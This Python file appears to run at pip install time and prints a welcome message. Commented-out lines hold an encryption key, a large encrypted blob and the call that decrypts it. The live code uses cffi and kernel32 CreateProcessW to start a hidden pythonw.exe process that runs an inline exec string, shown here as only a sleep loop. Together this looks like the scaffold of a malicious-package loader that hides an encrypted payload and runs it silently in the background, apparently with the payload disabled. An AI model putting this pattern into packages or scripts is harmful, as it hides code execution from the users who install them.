from cryptography.fernet import Fernet
import os

def main():
    print("pip install over!!! welcome!!!good bye!!!")
    # k = b'dKo4hyHEpj5zxNmpK3HThOpSLS-vLkCKAV6PQfdV6tM='
    # my_str = b'gAAAAABoQ6e-nQfs6Mjd7hzSHMGxp8XvsPWOZ9qTWKwzj3PoLzf5KXlzd8OMhfph4pg4GSEZ71TZ35Vx9du7NvmQ9jfLgXg-s9JrdmEkgBxwcwDOYKXSUIfVoxypLPiccX6YPfhbQ4tUYTUOxwDWtxZIPMlNCWZkUS2vgBGulD8M-nYFJn5amTVtO4X5P9MCWqz36In_IS7jiylI-ifj8zG_EghFUHmzAzcyH-bOGPtFbOixjVgxHxmiBfzuofxy1Se0-sNppCIzw_qId6WrqBhJk13Wy0trZWffJWejg9DuqSq1dvplJd-WPEjQGXvShZ7hmV1y-fRFT8eCrbAN2YwZHVbm0m4U8C81sgegJMb25TFvrk5fWlceLd9kfMu5zgoY846oC8j7qeJcA1UEGncKhqH4AaYk4RoqkxeqL_2SM97slqTlgLRfIqAcPClkWfROKJgCPCm9MtWkl7wR_W0nP056babmkdKQhxvGsBRfVyfDRWOJhZR30F4oMtgsgAoNCNrQ7m_JzFjE1bjA8kCClNWo6Vqhwh0B6mQnzIFgYfFZe_khMEtxfTCBJktpWFbcWz8Iy1CiLAr1LXA6nzu2tD4AQdw8JhQXT_V2-EkUO18UwUp0Kk8dc9Fffs-EuT2SMMueMxm0nlItPsQttN91AvUYDAKjrKOJjJ3dXzkhmb9YtHFgnvC3OxlTG8jjtFSzV47r3rmolZglr8BZEkajBpnfj8TbL-b4UvM1z4dKig5_-qmjdTtW1h1-i4US4_Ry2_GFqy9t2TPGm4XJ4O8uRKoEyFrdss_RItXj6sDg2xehXoUTuKENXKlcKesnXAW1ndFfAOEvEShvcNf9utoFARJVpLddEXC6BAT4B7lSwAGNCVmyn7OfMfdqE05e_cXM6EUqTQqo269RB6n4rQ9KPKaTu4a9gQEECuh2zz407dr-llFZjWHyGRLiKP29bET1xej5w4nmaqrbfGEBTUsni6G5anZUqUuVH4NU8UjKPRk_2LCL7GzDURYU69fJWqypV0ZUkSW7AY89l_8eTcUUTLndFUlOVQ8qHml89DmVmm6kFUXN3p8U_Ol_vCW9wAokAgrmhqC7KDZ2rivqRrtUIOvNC2n70FUu-lwb858XqZSBIm7q7KyRBXexIhOh6h93YvZGmDF682T3Ce3-BNA7ewdIh_xOeVJtcyMQ3SAnNB3u1qbqQYI0xB00f7-mMSRk7clNetuOQzbEjruJbSa5xiqSKqHx0840FoULHjJJeufETNTbdEAIrNn5r9pBA55vqmrs5XEBIimEsv90O3J_RX0MCZkuU0dk1lIGjrFGsQTs9cAK9mXA694XtEXknH-H1zWyEaXc6HomE2jM1Fln-d5ASFhckxJuMJU7Jym5m5Turwp1VHLkvYe_0ipi3HdpiILa9ctmfQ71S91ZuzxmbfA6cdOVx44O-zTqZ2uftET2OfqMKVdyDq2MZ0YwRhtqREipzTB_CcXmcnooKum6F46EewfSd6foOJGUahyC5_VTiALQNbmNSrw1SrdPMVEIOJRxqPLprlFMm91zNg-J1H64rwDuiVb-dboCpFBmNKpRWDPyIsXnQEc53ZNpTPZzqXSwOEUDY-M1DKrCSGUodJEJ9g28Ir70sZrAKJGHqzXJHn40nrYhN71I6W2_Oj06p7PzEOgh-qNOLo7g1sen3vUq-Q3X-ITm4BXyP6ex3jgHrVe_C3NxYBp3LaaXNIVCDWdpzNdnIvImFgqKjbZMe0Er_JCYQMSGqxytN8LJmdzfmoY4XxNo03ffTCjP_dXQidpThhi9Tl18HkbCkJ72ZxZsHUteVf9JiSflPjiMnGHLYLnBqzG6lSbVrkAv8myNhIWQeYHaMn7GdmuCM-nlTPzZ-aUeDr_Jpi7C0VK_F5GHIYJW2zWxptx9qDq6Bje1kCHV0b4CLvSJL62uDQpKje65_kCT7W8QjehlPfa1HyyQ00RDKAftfFzoCT3kGEAg3GHW1o5CJzaO8N8Dh3taovfpwPdG1J9clIiwAw0XSF7HbmZdY8uOf2RUsYGLjUVHIJOtyxm3pydsDq1Vptf2U5-pH1XcOOaryPIunInfQ8HkzoT50zdlouIvs1QTjCg2zrMddB82pog1FG8S-OIBR-tK40ldRFCplwF7-mtV98IID58Ic_y9DTySQkVM3tnoF5I7tuPdfToDhJz0cCB3TCGB4uSMnjegnznNJMq2luFi60qOUwrCYyuI3gT5E9STzXUq95TprBQuO_5i4BZb1eK4mg3SoNbdXFfnAgGAPbNup66ZomMBWF7K4BmbyKR4UcnBI_R0fnR6A6u_-Wsa7g2kqHoI5mtZQFBEm3DVeEX9VT4V_8Wn8zmB55B8fPTvSbMmP7KxcxdaqKFZqAepCfVmKcBLzG094otazVqVdK4NUN5hyEYJMDWk-HT1fKg8vqm2Jkr9dyu5hTx5OhOHBsephNihze1yJEPH2lbwBGW9RVjagHhKYo8fnbinoC9cWRw7NKLYwlNY2hgchW6mkyYDog5dcOn773AkveKrFchwc6wmAmFerTyeYBf4e-rUAu8GOPzaBF5XGhs5TjUnN_7erviiLqVaa10Bo_lUvq5HHPf5_-d4ayQth4YZsGfLh0K0ehVu1MPHyZoMJEUzJWFQZ5f6Zh-GAA6HrphJgFyRmG331hA1qwCu93sEArSse83DqJp0yuzejetKPRJJhJQi4OqzgA=='
    # plaintext = Fernet(k).decrypt(my_str)
    from cffi import FFI
    import sys

    ffi = FFI()

    ffi.cdef("""
        typedef unsigned long DWORD;
        typedef int BOOL;
        typedef void* LPVOID;
        typedef wchar_t WCHAR;
        typedef WCHAR* LPWSTR;
        typedef const WCHAR* LPCWSTR;
        
        typedef struct _SECURITY_ATTRIBUTES {
            DWORD nLength;
            LPVOID lpSecurityDescriptor;
            BOOL bInheritHandle;
        } SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
        
        typedef struct _STARTUPINFOW {
            DWORD cb;
            LPWSTR lpReserved;
            LPWSTR lpDesktop;
            LPWSTR lpTitle;
            DWORD dwX;
            DWORD dwY;
            DWORD dwXSize;
            DWORD dwYSize;
            DWORD dwXCountChars;
            DWORD dwYCountChars;
            DWORD dwFillAttribute;
            DWORD dwFlags;
            WORD wShowWindow;
            WORD cbReserved2;
            LPBYTE lpReserved2;
            HANDLE hStdInput;
            HANDLE hStdOutput;
            HANDLE hStdError;
        } STARTUPINFOW, *LPSTARTUPINFOW;
        
        typedef struct _PROCESS_INFORMATION {
            HANDLE hProcess;
            HANDLE hThread;
            DWORD dwProcessId;
            DWORD dwThreadId;
        } PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
        
        BOOL CreateProcessW(
            LPCWSTR lpApplicationName,
            LPWSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles,
            DWORD dwCreationFlags,
            LPVOID lpEnvironment,
            LPCWSTR lpCurrentDirectory,
            LPSTARTUPINFOW lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
        );
    """)

    kernel32 = ffi.dlopen("kernel32.dll")

    startup_info = ffi.new("STARTUPINFOW*")
    startup_info.cb = ffi.sizeof("STARTUPINFOW")
    process_info = ffi.new("PROCESS_INFORMATION*")

    application_path = "pythonw.exe"
        
    app_path_wide = ffi.new("wchar_t[]", application_path)
    a = r'import time; exec(\"while True: time.sleep(5)\")'
    s = f'pythonw.exe -c "{a}"'
    command_line = s
        
    if command_line:
        if isinstance(command_line, (list, tuple)):
            command_line = " ".join(command_line)
        cmd_line_wide = ffi.new("wchar_t[]", command_line)
    else:
        cmd_line_wide = ffi.NULL
        
    success = kernel32.CreateProcessW(
        app_path_wide,          # 应用程序名称
        cmd_line_wide,          # 命令行参数
        ffi.NULL,               # 进程安全属性
        ffi.NULL,               # 线程安全属性
        False,                  # 不继承句柄
        0,                      # 创建标志
        ffi.NULL,               # 环境块
        ffi.NULL,               # 当前目录
        startup_info,           # STARTUPINFO
        process_info            # PROCESS_INFORMATION
    )

    

if __name__ == "__main__":
    main()
